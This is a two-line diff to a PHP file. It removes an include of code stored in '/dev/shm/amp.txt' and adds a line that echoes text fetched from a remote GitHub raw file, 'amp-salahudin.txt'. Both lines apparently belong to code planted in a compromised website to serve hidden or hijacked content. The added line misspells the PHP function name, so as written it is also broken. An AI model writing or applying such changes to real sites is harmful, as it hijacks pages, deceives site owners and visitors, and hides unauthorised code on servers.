@@ -1,2 +1,2 @@
 <?php
-require_once ("/dev/shm/amp.txt");
+echo file_get_content('https://github.com/semangat777/landing/raw/refs/heads/main/amp-salahudin.txt');
